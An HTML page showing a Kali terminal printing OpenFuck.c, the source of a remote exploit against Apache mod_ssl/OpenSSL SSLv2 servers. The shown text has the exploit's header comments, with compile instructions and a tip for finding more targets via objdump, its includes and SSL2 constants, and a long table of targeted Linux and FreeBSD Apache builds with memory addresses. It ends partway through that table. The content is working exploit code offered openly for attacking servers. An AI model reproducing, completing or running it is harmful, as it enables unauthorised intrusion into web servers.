<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Openfuck.c</title>
</head><body>┌──(kali㉿kali)-[~/OpenFuck]<br/>
└─$ cat OpenFuck.c <br/>
/*<br/>
&nbsp;*<br/>
&nbsp;* OF version r00t VERY PRIV8 spabam<br/>
&nbsp;* Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto<br/>
&nbsp;* objdump -R /usr/sbin/httpd|grep free to get more targets<br/>
&nbsp;* #hackarena irc.brasnet.org<br/>
&nbsp;*/<br/>
<br/>
#include &lt;arpa/inet.h&gt;<br/>
#include &lt;netinet/in.h&gt;<br/>
#include &lt;sys/types.h&gt;<br/>
#include &lt;sys/socket.h&gt;<br/>
#include &lt;netdb.h&gt;<br/>
#include &lt;errno.h&gt;<br/>
#include &lt;string.h&gt;<br/>
#include &lt;stdio.h&gt;<br/>
#include &lt;unistd.h&gt;<br/>
<br/>
#include &lt;openssl/ssl.h&gt;<br/>
#include &lt;openssl/rsa.h&gt;<br/>
#include &lt;openssl/x509.h&gt;<br/>
#include &lt;openssl/evp.h&gt;<br/>
<br/>
#include &lt;openssl/rc4.h&gt;<br/>
#include &lt;openssl/md5.h&gt;<br/>
#define SSL2_MT_ERROR 0<br/>
#define SSL2_MT_CLIENT_FINISHED 3<br/>
#define SSL2_MT_SERVER_HELLO 4<br/>
#define SSL2_MT_SERVER_VERIFY 5<br/>
#define SSL2_MT_SERVER_FINISHED 6<br/>
#define SSL2_MAX_CONNECTION_ID_LENGTH 16<br/>
<br/>
/* update this if you add architectures */<br/>
#define MAX_ARCH 138<br/>
<br/>
struct archs {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; char* desc;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int func_addr; &nbsp;/* objdump -R /usr/sbin/httpd | grep free */<br/>
} architectures[] = {<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Caldera OpenLinux (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080920e0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Cobalt Sun 6.0 (apache-1.3.12)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x8120f0c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Cobalt Sun 6.0 (apache-1.3.20)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x811dcb8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Cobalt Sun x (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x8123ac3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Cobalt Sun x Fixed2 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x81233c3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 4 (apache-1.3.6)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08075398<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 4.1 (apache-1.3.9)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808f2fe<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 6 (apache-1.3.14)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809222c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 7 (apache-1.3.12)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808f874<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 7 (apache-1.3.19)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08088aa0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 7/8 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808e628<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Conectiva 8 (apache-1.3.22)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808b2d0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08095264<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache_1.3.19-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080966fc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache_1.3.22-2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08096aac<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache-1.3.22-2.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08083828<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache-1.3.22-5)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08083728<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache_1.3.23-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08085de8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache_1.3.24-2.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08087d08<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Debian Linux GNU Linux 2 (apache_1.3.24-2.1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080873ac<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache_1.3.24-3)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08087d68<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache-1.3.26-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0080863c4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Debian GNU Linux 3.0 Woody (apache-1.3.26-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080863cc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Debian GNU Linux (apache-1.3.27)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0080866a3<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
<br/>
<br/>
{ "FreeBSD (apache-1.3.9)", 0xbfbfde00 },<br/>
{ "FreeBSD (apache-1.3.11)", 0x080a2ea8 },<br/>
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a7f58 },<br/>
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a0ec0 },<br/>
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a7e7c },<br/>
{ "FreeBSD (apache-1.3.12.1.40_1)", 0x080a7f18 },<br/>
{ "FreeBSD (apache-1.3.12)", 0x0809bd7c },<br/>
{ "FreeBSD (apache-1.3.14)", 0xbfbfdc00 },<br/>
{ "FreeBSD (apache-1.3.14)", 0x080ab68c },<br/>
{ "FreeBSD (apache-1.3.14)", 0x0808c76c },<br/>
{ "FreeBSD (apache-1.3.14)", 0x080a3fc8 },<br/>
{ "FreeBSD (apache-1.3.14)", 0x080ab6d8 },<br/>
{ "FreeBSD (apache-1.3.17_1)", 0x0808820c },<br/>
{ "FreeBSD (apache-1.3.19)", 0xbfbfdc00 },<br/>
{ "FreeBSD (apache-1.3.19_1)", 0x0808c96c },<br/>
{ "FreeBSD (apache-1.3.20)", 0x0808cb70 },<br/>
{ "FreeBSD (apache-1.3.20)", 0xbfbfc000 },<br/>
{ "FreeBSD (apache-1.3.20+2.8.4)", 0x0808faf8 },<br/>
{ "FreeBSD (apache-1.3.20_1)", 0x0808dfb4 },<br/>
{ "FreeBSD (apache-1.3.22)", 0xbfbfc000 },<br/>
{ "FreeBSD (apache-1.3.22_7)", 0x0808d110 },<br/>
{ "FreeBSD (apache_fp-1.3.23)", 0x0807c5f8 },<br/>
{ "FreeBSD (apache-1.3.24_7)", 0x0808f8b0 },<br/>
{ "FreeBSD (apache-1.3.24+2.8.8)", 0x080927f8 },<br/>
{ "FreeBSD 4.6.2-Release-p6 (apache-1.3.26)", 0x080c432c },<br/>
{ "FreeBSD 4.6-Realease (apache-1.3.26)", 0x0808fdec },<br/>
{ "FreeBSD (apache-1.3.27)", 0x080902e4 },<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Gentoo Linux (apache-1.3.24-r2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086c34<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Linux Generic (apache-1.3.14)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xbffff500<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux X.x (apache-1.3.22-10.1mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080808ab<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.1 (apache-1.3.14-2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809f6c4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809d233<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.2 (apache-1.3.14-2mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809f6ef<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.2 (apache-1.3.14) 2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809d6c4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809ccde<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809ce14<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809d262<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08083545<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 8.0 (apache-1.3.19-3)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809ea98<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 8.1 (apache-1.3.20-3)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0809e97c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Mandrake Linux 8.2 (apache-1.3.23-4)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086580<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Mandrake Linux 8.2 #2 (apache-1.3.23-4)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086484<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Mandrake Linux 8.2 (apache-1.3.24)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08086665<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; { &nbsp; &nbsp; &nbsp; "Mandrake Linux 9 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808b864<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux ?.? GENERIC (apache-1.3.12-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808c0f4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux TEST1 (apache-1.3.12-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808c0f4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux TEST2 (apache-1.3.12-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808c0f4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080d2c35<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 4.2 (apache-1.1.3-3)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08065bae<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 5.0 (apache-1.2.4-4)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808c82c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 5.1-Update (apache-1.2.6)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08092a45<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 5.1 (apache-1.2.6-4)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x08092c2d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 5.2 (apache-1.3.3-1)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0806f049<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808e4d8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.0 (apache-1.3.6-7)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080707ec<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.0 (apache-1.3.6-7)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x080707f9<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808fd52<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.0 Update (apache-1.3.24)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x80acd58<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.1 (apache-1.3.9-4)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808ccc4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.1 (apache-1.3.9-4)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808ccdc<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808fd5d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.1-fp2000 (apache-1.3.26)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x082e6fcd<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.2 (apache-1.3.12-2)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808f689<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.2 (apache-1.3.12-2)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808f614<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.2 mod(apache-1.3.12-2)3",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xbffff94c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.2 update (apache-1.3.22-5.6)1",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808f9ec<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "RedHat Linux 6.2-Update (apache-1.3.22-5.6)2",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808f9d4<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Redhat Linux 7.x (apache-1.3.22)",<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0808400c<br/>
&nbsp; &nbsp; &nbsp; &nbsp; },<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
